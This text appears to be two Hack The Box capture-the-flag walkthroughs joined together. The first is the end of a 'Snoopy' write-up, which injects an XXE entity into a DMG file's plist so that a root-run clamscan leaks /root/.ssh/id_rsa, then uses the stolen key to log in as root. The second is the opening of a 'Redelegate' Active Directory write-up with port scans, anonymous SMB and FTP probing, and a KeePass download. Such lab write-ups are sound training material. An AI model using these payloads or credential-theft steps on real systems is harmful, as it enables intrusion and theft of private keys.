From the answer, the file can contain plst XML property which is our target for XXE. For adding the injection, we need a readymade DMG file or we can create one ourselves. We will use the readymade DMG files and we found one as the Sublime Text software’s DMG file. We can download it at link. As DMG files are Mac disk image, download the Mac version of Sublime Text.
We can open the file in any hex editor (e.g ghex) to modify the XML content:
└─$ ghex sublime.dmg Using CTRL + F, search for DOCTYPE and modify the part highlighted below
Modiy it with the XXE payload:
[<!ENTITY lk SYSTEM "file:///root/.ssh/id_rsa">]> After modification, it will look like this
Substitute the remaining content after the ]> with spaces until the dot before <plist. Now use find again to search for plst where we will add the key of XXE.
Replace plst with &lk; as in the image
After modification, use CTRL + S to save the file and transfer it to the target machine. Then copy it into scanfiles directory:
sbrown@snoopy:~$ cp sublime.dmg scanfiles/sublime.dmg Running clamscan in –debug mode produces a large amount of output. Instead of scrolling through the terminal to locate the leaked id_rsa contents, we can use the script command to record the terminal session to a file named typescript for easier analysis.
sbrown@snoopy:~$ script Script started, output log file is 'typescript'. Run the file scanning as root now:
sbrown@snoopy:~$ sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/sublime.dmg After the scanning, use exit to stop the logging
sbrown@snoopy:~$ exit exit Script done. And use less with the typescript file:
sbrown@snoopy:~$ less typescript then /PRIVATE KEY and Enter to jump to the key.
Root Access # Here we are seeing the private key content of id_rsa. Carefully save the whole content in a file on our attack host
Then use that to log in as root to the system
└─$ chmod 600 id_rsa └─$ ssh -i id_rsa root@10.129.229.5 Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the 'unminimize' command. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Wed Jul 8 20:51:56 2026 from 10.10.14.66 root@snoopy:~# The root.txt is accessible now in the current directory:
root@snoopy:~# ls -l root.txt -rw-r----- 1 root root 33 Jul 8 17:16 root.txt
summary: Chain LFI, DDNS abuse, Mattermost takeover, Git symlink exploitation, and ClamAV XXE to gain root on this Hard Linux machine.
title: Snoopy Machine Writeup | HTB

content:
Summary # Redelegate is a hard-difficulty Windows Active Directory machine that begins with anonymous FTP access, exposing a KeePass database containing credentials. After cracking the KeePass master password using contextual password patterns, valid MSSQL credentials are recovered and abused to enumerate domain users through SQL Server. Password reuse leads to the compromise of a domain user account with ForceChangePassword privileges over another user, enabling access to the Domain Controller via WinRM. Finally, by abusing SeEnableDelegationPrivilege together with GenericAll over a computer account, the attacker configures Constrained Delegation, impersonates a privileged Domain Admin account using S4U2Self/S4U2Proxy, performs a DCSync attack, and obtains full domain compromise.
Reconnaissance # Rustscan # We start with Rustscan to quickly identify all the open ports from the total of 65535 possible ports.
└─$ rustscan -a 10.129.234.50 -r 0-65535 PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 127 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 1433/tcp open ms-sql-s syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 49932/tcp open unknown syn-ack ttl 127 55021/tcp open unknown syn-ack ttl 127 64060/tcp open unknown syn-ack ttl 127 64061/tcp open unknown syn-ack ttl 127 64067/tcp open unknown syn-ack ttl 127 64080/tcp open unknown syn-ack ttl 127 64082/tcp open unknown syn-ack ttl 127 65211/tcp open unknown syn-ack ttl 127 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap 10.129.234.50 -T4 -sC -sV -p 21,53,80,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5985,9389,47001,49664,49665,49667,49668,49932,55021,64060,64061,64067,64080,64082,65211 Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-06 08:47 +0500 Nmap scan report for 10.129.234.50 Host is up (0.093s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 10-20-24 01:11AM 434 CyberAudit.txt | 10-20-24 05:14AM 2622 Shared.kdbx |_10-20-24 01:26AM 580 TrainingAgenda.txt 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2026-07-06 03:47:46Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2026-07-06T03:40:07 |_Not valid after: 2056-07-06T03:40:07 | ms-sql-ntlm-info: | 10.129.234.50:1433: | Target_Name: REDELEGATE | NetBIOS_Domain_Name: REDELEGATE | NetBIOS_Computer_Name: DC | DNS_Domain_Name: redelegate.vl | DNS_Computer_Name: dc.redelegate.vl | DNS_Tree_Name: redelegate.vl |_ Product_Version: 10.0.20348 | ms-sql-info: | 10.129.234.50:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_ssl-date: 2026-07-06T03:48:45+00:00; -1s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: redelegate.vl, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=dc.redelegate.vl | Not valid before: 2026-07-05T03:37:31 |_Not valid after: 2027-01-04T03:37:31 |_ssl-date: 2026-07-06T03:48:45+00:00; -1s from scanner time. | rdp-ntlm-info: | Target_Name: REDELEGATE | NetBIOS_Domain_Name: REDELEGATE | NetBIOS_Computer_Name: DC | DNS_Domain_Name: redelegate.vl | DNS_Computer_Name: dc.redelegate.vl | DNS_Tree_Name: redelegate.vl | Product_Version: 10.0.20348 |_ System_Time: 2026-07-06T03:48:35+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49932/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-info: | 10.129.234.50:49932: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 49932 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2026-07-06T03:40:07 |_Not valid after: 2056-07-06T03:40:07 | ms-sql-ntlm-info: | 10.129.234.50:49932: | Target_Name: REDELEGATE | NetBIOS_Domain_Name: REDELEGATE | NetBIOS_Computer_Name: DC | DNS_Domain_Name: redelegate.vl | DNS_Computer_Name: dc.redelegate.vl | DNS_Tree_Name: redelegate.vl |_ Product_Version: 10.0.20348 |_ssl-date: 2026-07-06T03:48:45+00:00; -1s from scanner time. 55021/tcp open msrpc Microsoft Windows RPC 64060/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 64061/tcp open msrpc Microsoft Windows RPC 64067/tcp open msrpc Microsoft Windows RPC 64080/tcp open msrpc Microsoft Windows RPC 64082/tcp open msrpc Microsoft Windows RPC 65211/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: -1s, deviation: 0s, median: -1s | smb2-time: | date: 2026-07-06T03:48:39 |_ start_date: N/A As the Nmap output shows the DNS name of the domain and the target, we will add them to our /etc/hosts file:
└─$ sudo nano /etc/hosts 10.129.234.50 redelegate.vl dc.redelegate.vl dc To sync the system time with the target Domain Controller:
└─$ sudo ntpdate 10.129.234.50 Initial Access # As we don’t have any domain account credentials, we will check if anonymous SMB authentication is allowed:
└─$ nxc smb 10.129.234.50 -u '' -p '' SMB 10.129.234.50 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True) SMB 10.129.234.50 445 DC [+] redelegate.vl\: Anonymous authentication is allowed, but attempting to enumerate shares results in an access denied error:
└─$ nxc smb 10.129.234.50 -u '' -p '' --shares SMB 10.129.234.50 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:None) (Null Auth:True) SMB 10.129.234.50 445 DC [+] redelegate.vl\: SMB 10.129.234.50 445 DC [-] Error enumerating shares: STATUS_ACCESS_DENIED Moving to the HTTP port 80, the IIS server shows the default landing page
Directory brute-forcing and subdomain enumeration with ffuf did not reveal anything interesting.
└─$ ffuf -u 'https://10.129.234.50/FUZZ' -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404 Anonymous FTP Enumeration # The target allows anonymous authentication on the FTP service. Logging in with the username anonymous and a blank password grants access to the shared files.
└─$ ftp 10.129.234.50 Connected to 10.129.234.50. 220 Microsoft FTP Service Name (10.129.234.50:flamo): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. Listing the available files reveals two text documents and a KeePass database.
ftp> ls 10-20-24 01:11AM 434 CyberAudit.txt 10-20-24 05:14AM 2622 Shared.kdbx 10-20-24 01:26AM 580 TrainingAgenda.txt Before downloading the database, it is important to switch the FTP client into binary mode. The interactive FTP client uses ASCII mode by default, which converts line endings during transfer. While this is suitable for text files, it corrupts binary files such as Shared.kdbx.
ftp> get Shared.kdbx 150 Opening ASCII mode data connection. ... WARNING! 10 bare linefeeds received in ASCII mode. File may not have transferred correctly. To preserve the file correctly, change the transfer mode before downloading:
ftp> binary 200 Type set to I. ftp> get Shared.kdbx Reviewing TrainingAgenda.txt reveals that users were being trained to avoid passwords following the pattern SeasonYear!.
